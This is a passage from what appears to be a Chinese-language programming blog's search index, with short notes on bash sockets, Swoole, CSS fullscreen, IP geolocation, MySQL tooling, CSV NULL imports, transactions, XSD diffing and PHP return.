秒後自動停止接收資料\ntimeout 1 cat <&3\n\n# 關閉輸入與輸出 socket\nexec 3<&-\nexec 3>&-\n```\n\n這時候可以去看 `/dev/xxx/fd/3` 可以看到這個檔案\n不過我不確定別的程式語言建立 socket 會不會產生這個檔案??\n\n我使用 `php -S 0.0.0.0:80` 建立簡單的 Server\n使用`ps aux | grep php` 看 PID\n進入 `/proc/{PID}/fd/` 使用 `ls -l` 可以看到一些檔案參照 socket\n但是怎麼知道是輸入還是輸出，我就沒深入研究\n所以我研判是 socket 跟 fd 是有關係的(應該 = =a)\n\n\n[Bash 程式設計教學：開啟 TCP/UDP Socket 網路連線 - G. T. Wang](https://blog.gtwang.org/programming/bash-tutorial-open-tcp-udp-socket/)\n[Bash shell 連接 Socket 寫法 | Tsung's Blog](https://blog.longwin.com.tw/2012/09/bash-shell-socket-connect-2012/)\n\n我發現 zsh 不能實作，要在 bash 裡面一條一條執行才可以\n用成 `xxx.sh` 不能跑，目前沒有深入找這個問題\n\n這讓我想以前 TCP 概論課程有用 `telnet` 實作 接收 yahoo 網頁\n這上面範例應該是 Linux 方法!!\n\n### accept/connect、send/recv、close、listen、bind\n\n{% asset_img socket.png socket %}\n\n簡單小記一些 function 作用\n`socket()` 建立 socket 用的 fd \n`bind()` socket() 傳回來的 fd 放在 bind 命名\n`listen()` 監聽 socket，但重頭戲在 accept，需要下 accept() 別人才能練近來\n`accept()` 接受別人連線，等 client 發 `connect`\n`connect()` client 發起連線\n`send() , recv()` write read TCP??\n`sendto() , recvfrom()` write read UDP\n`close` 關閉連線\n\n首先，Server 會接收到 Client 資料，所以一開始 Server 會先做 **read**，確定收到資料才會做 write\n簡單來講把這個想成 http 就好理解。話說 http 也是 socket o.<\n\n想到這個我想想 socket 有沒有跟 https 憑證加密?\n~~不過網路上查了一下，沒有看到。都是額外用 function library 加密~~\n~~但也不是不能理解，畢竟 socket 介於 應用層 和 傳輸層中間~~\n當然有找到使用 openssl ，不過沒有看到別的程式語言用 [socket编程之openssl入门 - 我们的征途是星辰大海 - CSDN博客](https://blog.csdn.net/qq_21111579/article/details/52134507)\n[Java实现 SSL双向认证 Socket – Huang Shiyang](https://wp.huangshiyang.com/java%E5%AE%9E%E7%8E%B0-ssl%E5%8F%8C%E5%90%91%E8%AE%A4%E8%AF%81-socket)\n[TLS Socket , client & server in NodeJS - Morioh](https://morioh.com/p/4ee89beb93bd/tls-socket-client-server-in-nodejs)\n[1.7.4 SSL隧道加密TCP-Server-Swoole-Swoole文档中心](https://wiki.swoole.com/wiki/page/240.html)\n看來還是真的有的...\n\n題外話:我好奇 socket 是網路7層哪一層，裡面有寫[Socket 的哩哩扣扣 « Mark Lin Blog](http://marklin-blog.logdown.com/posts/2366799)\n\n更多資訊\n[TCP Socket Programming 學習筆記 | 雷德麥的藏書閣](http://zake7749.github.io/2015/03/17/SocketProgramming/)\n[Beej's Guide to Network Programming 正體中文版 · GitBook (Legacy)](https://legacy.gitbook.com/book/myliao/beej-s-guide-to-network-programming-chinese-zhtw/details)\n\n其實在看 io 複用一直在想為什麼要了解 socket\n原來是大有關係，目前我猜測應該是 socket 並非最佳連線，所以才有 io 複用那些解決方案\n到下面幾篇有很多都不是很了解，我盡量吸收\n\n### 接收緩存區、發送緩存區、阻塞/非阻塞、超時等概念\n\n[UDP Socket(套接字)——发送接收缓冲区 - 简书](https://www.jianshu.com/p/d3b6db70ad74)\n\n\n\n## IO复用\n\n[聊聊IO多路复用之select、poll、epoll详解 - 簡書](https://www.jianshu.com/p/dfd940e7fca2)\n\n說真的我以為講到 IO 應該就會講到硬碟...\n結果都是講 socket 東西\n看來這個才是基礎...\n\n這一塊我不是很了解\n簡單看到是在 epoll 比 select 還快\n是用監聽事件觀念\n這也是為什麼大家推使用 epoll 的 nginx\n[epoll相关基础知识 | 笔记本](https://xiaoyue26.github.io/2017/11/06/2017-11/epoll%E7%9B%B8%E5%85%B3%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/)\n\n\n### 同步、異步、阻塞、非阻塞\n\n[聊聊同步、异步、阻塞与非阻塞 - 簡書](https://www.jianshu.com/p/aed6067eeac9)\n\n看裡面的內容，會覺得同步和阻塞不會分辨\n我就突然想到 js 的 ajax 是異步，那這個會是阻塞還是不是阻塞?\n答案是異步非阻塞\n[JS 同步、異步、阻塞、非阻塞 - Sam - Medium](https://medium.com/@mts40110/js-%E5%90%8C%E6%AD%A5-%E7%95%B0%E6%AD%A5-%E9%98%BB%E5%A1%9E-%E9%9D%9E%E9%98%BB%E5%A1%9E-29e1e1c0193e)\n可以看上面連結\n寫的還滿清楚的\n\n### LINUX IO\n\n[聊聊Linux 五种IO模型 - 簡書](https://www.jianshu.com/p/486b0965c296)\n\n## 應用\n\n[Swoole的简单运用 - 知乎](https://zhuanlan.zhihu.com/p/34279200)\n\n\n看了這麼多還不是很了解，暫時整理到這邊...orz\n\n**2019-10-26**\n\n課程小記\n\n* Swoole Server \n* HTTP/Websocket Server\n* Task 異步任務\n這一快很像 MQ，但要可靠可以用\n* Timer 定時器\n* Memory 模組\n講者有提到這邊可以做 Memory Cache\nMemory Cache 可在 Redis 前面可做緩衝\n減輕Redis 負擔\n剛好網路上有找到 Github [GitHub - swooliy/memory-cache: Memory Cache base on swoole](https://github.erp.pub/swooliy/memory-cache)\n* Process\n\n* Coroutine\n\n\n\n更新 swoole 程式必須要重啟?\n需要。但現在有 Docker , K8s 機器所以做更新程式，服務不會中斷\n但是 websocket 還是會斷\n所以必須要做 websocket 重新連線機制\n\nWebsocket 要做 load balance\n需要做一個 main server 關聯所有 Websocket Server 溝通橋梁\n~~所有近來不是透過 main server 去做送~~\n而是自動直接 load balance 進去到 Websocket Server\n要透過發送訊息是 main server 做發送給所有 Websocket Server\n去做實作\n\nmain Server 雖然沒有講到要用什麼\n但我覺得 MQ(RabbitMQ) 用在這上面也是非常不錯的方法\n\n課程有提到\nsocket.io 跟 websocket 不太一樣\nsocket.io 有對非支援 websocket 瀏覽器的處理\n\nf","tags":["swoole"],"categories":["PHP"]},{"title":"CSS :fullscreen 全螢幕功能小記","url":"%2Fblog%2F2019%2F09%2F19%2FCSS-fullscreen-%E5%85%A8%E8%9E%A2%E5%B9%95%E5%8A%9F%E8%83%BD%E5%B0%8F%E8%A8%98%2F","content":"\n最近看到 CSS 可以控制全螢幕 style\n簡單測試一下\n還是有遇到一些小地雷\n小記小記，防止下次彩雷\n\n<!--more-->\n\n## :fullscreen\n\n是控制 CSS style ，不是控制畫面全螢幕，但這個對`F11`全螢幕沒有什麼作用\n\n## JS 觸發全螢幕\n\n```js\ndocument.documentElement.requestFullscreen()\n```\n\n這邊注意使用CSS要用`:fullscreen` or `html:fullscreen`\n使用`body:fullscreen`\n\n## 地雷\n\n### 開發者模式不能直接執行\n在 console.log 實作不會有效果\n會跑出錯誤\n`TypeError: The expression cannot be converted to return the specified type.`\n\n```js \ndocument.documentElement.requestFullscreen()\n```\n\n## 相關其他 JS 套件\n\n[[前端軍火庫]screenfull.js - 全螢幕顯示就是這麼簡單 | 全端開發人員天梯 - 點部落](https://dotblogs.com.tw/wellwind/2016/12/20/front-end-screenfull-js)\n[sindresorhus/screenfull.js: Simple wrapper for cross-browser usage of the JavaScript Fullscreen API](https://github.com/sindresorhus/screenfull.js)","tags":["fullscreen"],"categories":["CSS"]},{"title":"抓 IP 取得國家資訊方法","url":"%2Fblog%2F2019%2F09%2F17%2F%E6%8A%93-IP-%E5%8F%96%E5%BE%97%E5%9C%8B%E5%AE%B6%E8%B3%87%E8%A8%8A%E6%96%B9%E6%B3%95%2F","content":"\n今天看到有用 API 查 IP 是哪個國家方法\n不知 Server 會真的這樣做? (打外面網站)\n我一直以為可以直接看 IP 方式分辨\n所以爬了一下文\n\n<!--more-->\n\n## Discuz 解析IP 位置\n\n記得以前進去某些論壇可以看到 訪客 國家\n找了一下，真的不需要打 API\n[Discuz!开发之IP地址的解析方法 - 土著人宁巴的Discuz!专栏 - CSDN博客](https://blog.csdn.net/lih062624/article/details/70207925)\n\n## 免費打 API\n\n有看到這個 API 沒有限制一天打的流量\n\n[ip2c.org | free IP to Country server | self-updating every day](https://about.ip2c.org/#about)\n\n## 可抓 IP 資料到本地端\n\n### MAXMIND\n\n[GeoLite2 Free Downloadable Databases « MaxMind Developer Site](https://dev.maxmind.com/geoip/geoip2/geolite2/#Databases)\n\n[GeoIP2 Downloadable Databases « MaxMind Developer Site](https://dev.maxmind.com/geoip/geoip2/downloadable/#MaxMind_APIs)\n\n連套件都幫妳寫好了!!!真佛心\n\n### DBIP\n\n[Free IP Geolocation Database Downloads | DB-IP Lite](https://db-ip.com/db/lite.php)\n\n## 其他 API 網站\n\n[Tutorials and Code Samples for Finding Website Visitor Country Data](https://db-ip.com/tutorials/php-get-visitor-country)\n\n[What is the Best IP Geolocation API? - The ipdata Team - Medium](https://medium.com/@ipdata_co/what-is-the-best-commercial-ip-geolocation-api-d8195cda7027)\n\n[IP Info, IP Geolocation Tools and API| IPInfoDB](https://ipinfodb.com/)\n\n[geolocation - Best IP to Country Database - Stack Overflow](https://stackoverflow.com/questions/19514749/best-ip-to-country-database)\n\n[geolocation - Best IP to Country Database - Stack Overflow](https://stackoverflow.com/questions/19514749/best-ip-to-country-database)\n\n有空用在補充","tags":["ip"],"categories":["實用工具"]},{"title":"MySQL 使用變數和 vscode 快速產生內容範本","url":"%2Fblog%2F2019%2F09%2F15%2FMySQL-%E4%BD%BF%E7%94%A8%E8%AE%8A%E6%95%B8%E5%92%8C-vscode-%E5%BF%AB%E9%80%9F%E7%94%A2%E7%94%9F%E5%85%A7%E5%AE%B9%E7%AF%84%E6%9C%AC%2F","content":"\n最近重複的工作做一些改進\n如每個月重複執行 SQL 內容\n需要更快、還要更方便設定方法\n\n<!--more-->\n\n## MySQL set variable\n\n```sql\nset @_id = xxx;\n-- SELECT MAX(id)+1 FROM `xxx`\nset @name = 'name';\n-- SELECT * FROM `xxx` WHERE name LIKE '%name%'\n\nset @money = -140; -- how much\nset @end = NULL; -- format(EX:2018-10-26 19:00:00) or NULL\nset @bye_date = NULL; -- format(EX:2018-10-26 19:00:00) or NULL\n\n\n\nINSERT INTO `pay_type`(id,name,money)  VALUES(@_id,@name,@money);\n\n...\n\n```\n\n[MySQL :: MySQL 8.0 Reference Manual :: 13.7.6.1 SET Syntax for Variable Assignment](https://dev.mysql.com/doc/refman/8.0/en/set-variable.html)\n\n有用過，不能用在 `CREATE TABLE ...`\n\n\n## vscode Blueprint\n\n不管任何程式都可以使用\n詳細看裡面的測試圖片就可以了解怎麼使用\n[reesemclean/blueprint: Create files and folders of files from templates in Visual Studio Code](https://github.com/reesemclean/blueprint)\n\n./blueprint-templates/測試demo/__name__test.sql\n```sql\nCREATE TABLE `xxxx`.`{{ $table }}` (\n  `id` int(11) NOT NULL auto_increment,\n  `s` varchar(10) NOT NULL,\n  `s2` varchar(10) NOT NULL,\n  `user_number` varchar(100) NOT NULL,\n  PRIMARY KEY  (`id`)\n  KEY `s` (`s`),\n  KEY `s2` (`s2`)\n) ENGINE=InnoDB  DEFAULT CHARSET=utf8 COMMENT='{{$表格註解}}' AUTO_INCREMENT=1 ;\n```\n\n\n## 其他小記\n\n\n有一個 Blueprint 跟 API Blueprint 沒有關係\n相關教學連結\n[Kewang 的資訊進化論 - 貼文](https://www.facebook.com/kewang.information/posts/1940647046211660)\n\n","tags":["mysql"],"categories":["MySQL"]},{"title":"MySQL 比較兩個資料庫方法","url":"%2Fblog%2F2019%2F09%2F12%2FMySQL-%E6%AF%94%E8%BC%83%E5%85%A9%E5%80%8B%E8%B3%87%E6%96%99%E5%BA%AB%E6%96%B9%E6%B3%95%2F","content":"\n先留者，有空再實作看看\n\n> Red-Gate's MySQL Schema & Data Compare (Commercial)\n> Maatkit (now Percona)\n> liquibase\n> Toad\n> Nob Hill Database Compare (Commercial)\n> MySQL Diff\n> SQL EDT (Commercial)\n\n[Compare two MySQL databases - Stack Overflow](https://stackoverflow.com/questions/225772/compare-two-mysql-databases)\n[檔案收發系統 - IT閱讀](https://www.itread01.com/p/444490.html)\n\n**2019-10-07**\n聽說可以 table 比對 table 產生 sql 語法\n查了一下還真的有!!\n[(1) How to Compare two Databases using MySQL Workbench - YouTube](https://www.youtube.com/watch?v=YzEuCa5Bca0)\n[(1) mysql compare databases and sync | Mysql tutorial - YouTube](https://www.youtube.com/watch?v=_mpph3mLEt4)\n[mmatuson/SchemaSync: A MySQL Schema Versioning and Migration Utility](https://github.com/mmatuson/SchemaSync)\n[[Mysql] 使用mysqldiff和mysqldbcompare检查数据一致性 | zeven's blog](https://zeven0707.github.io/2018/10/08/%E4%BD%BF%E7%94%A8mysqldiff%E5%92%8Cmysqldbcompare%E6%AF%94%E8%BE%83%E6%95%B0%E6%8D%AE%E5%BA%93%E5%B7%AE%E5%BC%82/)\n\n```\n$ mysqldbcompare --server1=root:root@localhost --server2=root:root@localhost db1:db2 --changes-for=server1 -a --difftype=sql\n\n\n# WARNING: Objects in server1.db1 but not in server1.db2:\n# TABLE: table2\n#\n# WARNING: Objects in server1.db2 but not in server1.tb1:\n# TABLE: table3\n#\n#                                                   Defn    Row     Data\n# Type      Object Name                             Diff    Count   Check\n#-------------------------------------------------------------------------\n# TABLE     t1                                      pass    pass    -\n#           - Compare table checksum                                FAIL\n#           - Find row differences                                  FAIL\n#\n# Transformation for --changes-for=server1:\n#\n\n# Data differences found among rows:\nUPDATE db1.t1 SET b = 'Test 123' WHERE a = '1';\nUPDATE db1.t1 SET b = 'Test 789' WHERE a = '3';\nDELETE FROM db1.t1 WHERE a = '4';\nINSERT INTO db1.t1 (a, b) VALUES('5', 'New row - db2');\n\n\n# Database consistency check failed.\n#\n# ...done\n```\n[mysqldbcompare MySQL数据库比较工具 - 歪麦博客](https://www.awaimai.com/1531.html)\n","tags":["mysql"],"categories":["MySQL"]},{"title":"XSD 快速比較差異的工具","url":"%2Fblog%2F2019%2F09%2F11%2FXSD-%E5%BF%AB%E9%80%9F%E6%AF%94%E8%BC%83%E5%B7%AE%E7%95%B0%E7%9A%84%E5%B7%A5%E5%85%B7%2F","content":"\n最近收到要異動 XML\n在很大的 XML 中\n我需要尋找異動的 tag\n尋找有用工具來分析 XSD\n\n<!--more-->\n\n## NVM 安裝\n\n[Chocolatey Gallery | Maven 3.6.1.20190711](https://chocolatey.org/packages/maven)\n\n快速解決安裝環境的問題XD\n\n## Schema Diff Command Line Tool\n\n[Schema Diff Tool](https://www.membrane-soa.org/soa-model-doc/1.4/cmd-tool/schemadiff-tool.htm)\n\n可這邊下載檔案`soa-model-distribution-1.6.0-bin.zip`\n解壓縮出來\n需要設定 `SOA_MODEL_HOME` 環境變數\n再設定 path += `%SOA_MODEL_HOME%\\bin`\n\n更懶的話，直接到`bin`資料夾做\n\n```bash\nschemadiff <<first schema>> <<second schema>> [<<output directory>>]\nC:\\soa-model-distribution-1.4.X>bin\\schemadiff samples\\diff\\original\\article.xsd samples\\diff\\modified\\article.xsd schema-diff-output\n```\n\n會產生 HTML 檔案\n這可說是非常完美的格式\n有順利執行\n\n## xsdiff\n\n[valters/xsdiff: Compare XML XSD schemas with semantic diff, simple and straight differences report. Perfect if you need to see what has changed in huge schema file.](https://github.com/valters/xsdiff)\n\n安裝很簡單\n\n```bash\nmvn clean install\n# 單個檔案\njava -jar XsDiff-app/target/xsdiff-app-1.0.0.jar old/xxx.xsd new/xxx.xsd\n# 多個比較\n# 記得每個資料夾需要放schema.lst XSD 清單\njava -jar XsDiff-app/target/xsdiff-app-1.0.0.jar old/ new/\n```\n\n[xsdiff/Main.java at 0a31b666979a88e4bdf49b29c32947864a0a965c · valters/xsdiff](https://github.com/valters/xsdiff/blob/0a31b666979a88e4bdf49b29c32947864a0a965c/XsDiff-app/src/main/java/io/github/valters/xsdiff/app/Main.java#L61)\n\n有順利跑出來，但是比較像文字 diff 比較\n\n\n## XSD Compare\n\n[yoep/xsd-compare: Compare different XSD version files to each other](https://github.com/yoep/xsd-compare)\n\n因為我裝JAVA 10\n所以需要改`pom.xml`\n\n[javafx-maven-plugin/javafx-maven-plugin: Maven plugin for JavaFX](https://github.com/javafx-maven-plugin/javafx-maven-plugin)\n[Support for current JDK 9 and JDK 10 · Issue #287 · javafx-maven-plugin/javafx-maven-plugin](https://github.com/javafx-maven-plugin/javafx-maven-plugin/issues/287)\n```xml\n<pluginRepositories>\n    <pluginRepository>\n        <id>oss-sonatype-snapshots</id>\n        <url>https://oss.sonatype.org/content/groups/public/</url>\n        <snapshots>\n            <enabled>true</enabled>\n        </snapshots>\n    </pluginRepository>\n</pluginRepositories>\n```\n\n上面 xml 放在 `<build>`前面\n\n```xml\n            <plugin>\n                <groupId>com.zenjava</groupId>\n                <artifactId>javafx-maven-plugin</artifactId>\n                <version>8.9.0-SNAPSHOT</version>\n                <configuration>\n                    <appName>XSD Compare</appName>\n                    <title>XSD Compare</title>\n```\n在修改版本\n\n```bash\nmvn clean install\n# 完成編譯，可直接執行\njava -jar ./target/xsd-compare-0.0.6-SNAPSHOT.jar\n```\n\nGUI 介面看起來很炫\n但是我的 xml 不能開啟 orz\n\n\n\n\n## 小記\n\n目前還是`Schema Diff Command Line Tool`最實用\n不果改天找到更好用的工具在更新\n","tags":["xsd"],"categories":["XML"]},{"title":"MySQL QUOTE() 跳脫字元小記","url":"%2Fblog%2F2019%2F09%2F10%2FMySQL-QUOTE-%E8%B7%B3%E8%84%AB%E5%AD%97%E5%85%83%E5%B0%8F%E8%A8%98%2F","content":"\n最近找 MySQL 有什麼跳脫字元函式\n有爬到 `QUOTE()` 可以用\n但比較特別\n\n<!--more-->\n\n```\nmysql> SELECT QUOTE('w3re''source');\n+-----------------------+\n| QUOTE('w3re''source') |\n+-----------------------+\n| 'w3re\\'source'        | \n+-----------------------+\n1 row in set (0.03 sec)\n```\n\n[MySQL QUOTE() function - w3resource](https://www.w3resource.com/mysql/string-functions/mysql-quote-function.php)\n\n## 注意事項\n\n- `NULL` 會回傳 NULL 字串!!! 這一點還滿神奇的\n- 字串會被`'`包住\n\n透過這種特性，我可以用 SQL 組我要的字串\n\n### 組 sql 範例\n\n```sql\nselect concat(\"UPDATE oo SET a1 = \",quote(a1), \", a2 = \",quote(a2), \" WHERE id =\", bbb.id,\";\")\nFROM xxxx\ninner join bbb on ........\n```\n\n組完可以匯出 csv\n可以用我之前寫的[malagege/sqlMakecsv: for a sqltocsv package easy sample](https://github.com/malagege/sqlMakecsv)\n這時候會發現 csv 內容每一行前後都會有 `\"`\n一行式 SQL 可以用正規化解決\n\n但是多行的呢?\n我想到解決方法\n\n1. 用csv2xlsx 轉 xlsx [csv2xlsx CSV 轉 Excel 方法 | 程式狂想筆記](https://malagege.github.io/blog/2019/08/26/csv2xlsx-CSV-%E8%BD%89-Excel-%E6%96%B9%E6%B3%95/)\n\nxlsx 複製裡面內容出來  發現還是有 `\"`\n\n2. 開啟 Word 把所有內容`選擇性天上→超連結貼上`上面，即可解決!!!\n\n`QUOTE`跳脫字元函式可以解決`\"`,`'`問題","tags":["mysql"],"categories":["MySQL"]},{"title":"CSV 匯入到 MySQL 失敗小記(Data truncation: Incorrect date value: '' for column 'date_col' at row 1)","url":"%2Fblog%2F2019%2F09%2F09%2FCSV-%E5%8C%AF%E5%85%A5%E5%88%B0-MySQL-%E5%A4%B1%E6%95%97%E5%B0%8F%E8%A8%98-Data-truncation-Incorrect-date-value-for-column-date-col-at-row-1%2F","content":"\n最近自己產生出來的 csv 匯入 DB遇到一些問題\n之前 [csv 快速建立 MySQL 資料表方法 | 程式狂想筆記](https://malagege.github.io/blog/2019/08/21/csv-%E5%BF%AB%E9%80%9F%E5%BB%BA%E7%AB%8B-MySQL-%E8%B3%87%E6%96%99%E8%A1%A8%E6%96%B9%E6%B3%95/) 真的建立資料表很方便\n但最近採到一些雷\n在這邊整理一下\n\n<!--more-->\n\n## 用腳本 create table 失敗\n\n[csv 快速建立 MySQL 資料表方法 | 程式狂想筆記](https://malagege.github.io/blog/2019/08/21/csv-%E5%BF%AB%E9%80%9F%E5%BB%BA%E7%AB%8B-MySQL-%E8%B3%87%E6%96%99%E8%A1%A8%E6%96%B9%E6%B3%95/)\n用裡面腳本`create table`竟然失敗\n```\nRow size too large. The maximum row size for the used table type, not counting BLOBs, is 65535. This includes storage overhead, check the manual. You have to change some columns to TEXT or BLOBs\n```\n\n簡單說一下，就是一個varchar 是有限制大小，可能轉成`text`或著去原本 SQL 把他 `create table` 匯出來就可以了\n相關連結:\n- [10.4 限制表的列數和行的大小 - IT閱讀](https://www.itread01.com/articles/1476376830.html)\n- [10.4 限制表的列数和行的大小 - 程序园](http://www.voidcn.com/article/p-eeaxkihv-bhh.html)\n\n\n## Data truncation: Incorrect date value: '' for column  'date_col' at row 1\n\n這個問題困擾我很久了\n我後來發現是 `NULL` 在 csv 跟空字串一樣\n(這卻說csv `,,` 跟 `,\"\",` 都是一樣的...)\n好像 csv 跟 txt 沒法表示 NULL\n不過有看到官網`\\n`可以代表是 NULL [MySQL :: MySQL 8.0 Reference Manual :: 9.1.7 NULL Values](https://dev.mysql.com/doc/refman/8.0/en/null-values.html)\n但是我是用別的程式匯出 csv \ndbeaver 嘗試著匯出，再用 dbeaver 匯入\n結果一樣會有這個問題....(沒有看到\\n)\n這還是未解之謎\n但不知道是不是用 dbeaver 跟用 `SELECT ... INTO OUTFILE` 原理不一樣\n\n[MySQL :: MySQL 8.0 Reference Manual :: 13.2.7 LOAD DATA Syntax](https://dev.mysql.com/doc/refman/8.0/en/load-data.html)\n\n### 解決方法\n\n\n#### 標註 NULL 特殊字串\n\n[CSV import NULL string mark support · Issue #4223 · dbeaver/dbeaver](https://github.com/dbeaver/dbeaver/issues/4223)\n[MySQL Export Table to CSV](http://www.mysqltutorial.org/mysql-export-table-to-csv/)\n\n標註 NULL 欄位很簡單`ifnull(my_column, \"\")`\n\n**DBeaver 匯入可以選擇 null 取代**\n\n![](https://user-images.githubusercontent.com/12808832/35556162-7c08d688-05dc-11e8-9d97-2cbd451f3648.png)\n\n#### STR_TO_DATE\n\n[How to import a CSV file into a MySQL database? - Miguel Gomez - Medium](https://medium.com/@AviGoom/how-to-import-a-csv-file-into-a-mysql-database-ef8860878a68)\n\n`SELECT STR_TO_DATE(date_col), \"%M %d %Y\");`\n\nSTR_TO_DATE(\"\", \"%M %d %Y\")\n> 0000-00-00\nSTR_TO_DATE(NULL, \"%M %d %Y\")\n> NULL\n目前猜測\n```\nload data local infile 'file.txt' into table tableName \nSET payDate = str_to_date(@payDate, '%d/%m/%Y');\n```\n@payDate 應該是 '' 空字串\n\n#### IF 大法\n\n[MySQL load NULL values from CSV data - Stack Overflow](https://stackoverflow.com/questions/2675323/mysql-load-null-values-from-csv-data)\n\n```sql\nLOAD DATA infile '/tmp/testdata.txt'\nINTO TABLE moo\nfields terminated BY \",\"\nlines terminated BY \"\\n\"\n(@vone, @vtwo, @vthree, @vfour, @vfive)\nSET\none = nullif(@vone,''),\ntwo = nullif(@vtwo,''),\nthree = nullif(@vthree,''),\nfour = nullif(@vfour,'')\n;\n```\n\n與上方法大同小異，但我覺得上一種方法會比較好處理 NULL 放到 date欄位\n\n#### ,, 取代法(不要這樣用)\n\n這個方法 ,, 會取代掉空字串\n所以不要這樣用 QQ\n\n\n感覺還是沒有好用的方法\n匯出直接轉 sql 出來還是最方便的\n\n[mysql null problem? - Stack Overflow](https://stackoverflow.com/questions/4588364/mysql-null-problem)\n\n\n#### PHP 執行方法\n\n剛剛爬到有做 null 處理\n\n[sql - MySQL - SELECT * INTO OUTFILE LOCAL ? - Stack Overflow](https://stackoverflow.com/questions/2867607/mysql-select-into-outfile-local)\n\n```bash\nwget https://gist.githubusercontent.com/paslandau/37bf787eab1b84fc7ae679d1823cf401/raw/29a48bb0a43f6750858e1ddec054d3552f3cbc45/mysql2csv -O mysql2csv -q && (sha256sum mysql2csv | cmp <(echo \"b109535b29733bd596ecc8608e008732e617e97906f119c66dd7cf6ab2865a65  mysql2csv\") || (echo \"ERROR comparing hash, Found:\" ;sha256sum mysql2csv) ) && chmod +x mysql2csv\n```\n\n\n發現新的 sqltocsv 工具\n[StabbyCutyou/sqltocsv: Stream large SQL result sets into a local file](https://github.com/StabbyCutyou/sqltocsv)\n但不知道有沒有對 null 做處理\n\n[karissa/sql2csv: Commandline utility for easily converting a SQL select statement into csv](https://github.com/karissa/sql2csv)","tags":["csv"],"categories":["MySQL"]},{"title":"執行 SQL 做 rollback 方法 & 訂單編號高併發的小記","url":"%2Fblog%2F2019%2F09%2F08%2F%E5%9F%B7%E8%A1%8C-SQL-%E5%81%9A-rollback-%E6%96%B9%E6%B3%95%2F","content":"\n最近在想 phpmyadmin 到底能不能做到錯誤時 rollback\n先講結論...應該是不行的\n執行 phpmyadmin 時候好像沒被法判斷有沒有錯誤(指令的好像也一樣...)\n有什麼新發現，之後再修改\n\n<!--more-->\n\n我覺得最佳實例應該要用類似 DB client 執行\n手動切換交易模式(把 autocommit 關掉)\n\n執行每一段 SQL 後，確定 SQL 都執行正確\n\n依照結果手動下 commit 或 rollback \n改資料前可以先備份資料\n\nstored procedure 可以做到\n但因為沒什麼機會寫這個，所以先留著\n[sql - MySQL : transaction within a stored procedure - Stack Overflow](https://stackoverflow.com/questions/9974325/mysql-transaction-within-a-stored-procedure)\n[sql - try....catch in mysql for transaction? - Stack Overflow](https://stackoverflow.com/questions/30973002/try-catch-in-mysql-for-transaction)\n\n## isnert 失敗 auto_increment\n\n```sql\nALTER TABLE tbl auto_increment = 1\n```\n但有部分答案建議不要調整 auto_increment\n[MySQL Auto Increment Columns on TRANSACTION, COMMIT, and ROLLBACK - Stack Overflow](https://stackoverflow.com/questions/14758625/mysql-auto-increment-columns-on-transaction-commit-and-rollback)\n[transactions - MySQL AUTO_INCREMENT does not ROLLBACK - Stack Overflow](https://stackoverflow.com/questions/449346/mysql-auto-increment-does-not-rollback)\n\n後來我想到 insert into xxx values( select max(xxx) + 1 from xxx,'test' ); 會不會有高併發的問題 (其實很多程式都這樣寫)\n之前類似寫過 [MySQL(MariaDB) insert有關做相同表會遇到問題小記 | 程式狂想筆記](https://malagege.github.io/blog/2019/06/02/MySQL-MariaDB-insert%E6%9C%89%E9%97%9C%E5%81%9A%E7%9B%B8%E5%90%8C%E8%A1%A8%E6%9C%83%E9%81%87%E5%88%B0%E5%95%8F%E9%A1%8C%E5%B0%8F%E8%A8%98/)\n\n## 如何生產唯一訂單編號\n\n額外新開一個 table ，做訂單編號處理\n用 `SELECT ... FOR UPDATR`處理\n一直看到公司有看到商品編號額外開了一個 table\n現在有一種恍然大悟的感覺\n但開發者沒有加 `FOR UPDATE` 後來的 commit 有補上 `FOR UPDATE`\n相關 for update 處理\n> [用 SELECT ... FOR UPDATE 避免 Race condition @ Vexed's Blog :: 隨意窩 Xuite日誌](https://blog.xuite.net/vexed/tech/22289223-%E7%94%A8+SELECT+...+FOR+UPDATE+%E9%81%BF%E5%85%8D+Race+condition)\n> [MySQL 在高并发下的 订单撮合 系统使用 共享锁 与 排他锁 保证数据一致性 - 指尖下的幽灵 - 博客园](https://www.cnblogs.com/linguanh/p/10019002.html)\n\n更好的方法還有透過 redis 去做\n[java web系统在高并发下如何实现订单号生成唯一？ - 知乎](https://www.zhihu.com/question/21128632) {% asset_link web1.png 備份圖 %}\n[Redis 高并发问题,及解决方案！ - 简书](https://www.jianshu.com/p/6ce40dcbf3fe) {% asset_link web2.png 備份圖 %}\n[分布式架构系统生成全局唯一序列号的一个思路 - 知乎](https://zhuanlan.zhihu.com/p/32657546) {% asset_link web3.png 備份圖 %}\n\n其實這篇我原本主要是要紀錄 sql file 做 rollback\n但沒想到...從`isnert 失敗 auto_increment`到`如何生產唯一訂單編號`我覺得非常重要\n就先記錄了\n\n## mysql 執行 .sql\n\n[How to Run SQL Text File on MySQL Command Prompt – TecAdmin](https://tecadmin.net/run-sql-text-file-on-mysql-command-prompt/)","tags":["sql"],"categories":["SQL"]},{"title":"PHP return 特別的用法小記","url":"%2Fblog%2F2019%2F09%2F08%2FPHP-return-%E7%89%B9%E5%88%A5%E7%9A%84%E7%94%A8%E6%B3%95%E5%B0%8F%E8%A8%98%2F","content":"\n今天看到我同事用 `return` 寫在 xxx.php(沒有寫在 return 裡面)\n我印象中 return 通常都寫在 function 裡面\n查看了一下官方文件 [PHP: return - Manual](https://www.php.net/manual/zh/function.return.php)\n可以寫在 function 外面\n\n<!--more-->\n\n## 先講講單一文件\n\n文件有講到 return 不是一個 function\n先講講這個跟 `die/exit`哪裡不一樣\n\n```php\n<?php\nreturn 2;\n```\n\n```php\nexit(2);\n```\n\n要怎麼看錯誤碼，我以前這篇寫過\n[linux 設定環境變數 | 程式狂想筆記](https://malagege.github.io/blog/2018/08/09/linux-%E8%A8%AD%E5%AE%9A%E7%92%B0%E5%A2%83%E8%AE%8A%E6%95%B8/)\n\n> \\$?是指令回傳錯誤碼\n\n## 有做 include 文件\n\n> 如果在全局範圍中調用，則當前腳本文件中止運行。如果當前腳本文件是被 include 的或者 require 的，則控制交回調用文件。此外，如果當前腳本是被 include 的，則 return 的值會被當作 include 調用的返回值。如果在主腳本文件中調用 return，則腳本中止運行。如果當前腳本文件是在 php.ini 中的配置選項 auto_prepend_file 或者 auto_append_file 所指定的，則此腳本文件中止運行。\n\n我覺得先看範例\n\n```php\na.php\n<?php\ninclude(\"b.php\");\necho \"a\";\n?>\n```\n\nb.php\n\n```php\n<?php\necho \"b\";\nreturn;\n?>\n```\n\n(executing a.php:) will echo \"ba\".\n\nwhereas (b.php modified):\n\na.php\n\n```php\n<?php\ninclude(\"b.php\");\necho \"a\";\n?>\n```\n\nb.php\n\n```php\n<?php\necho 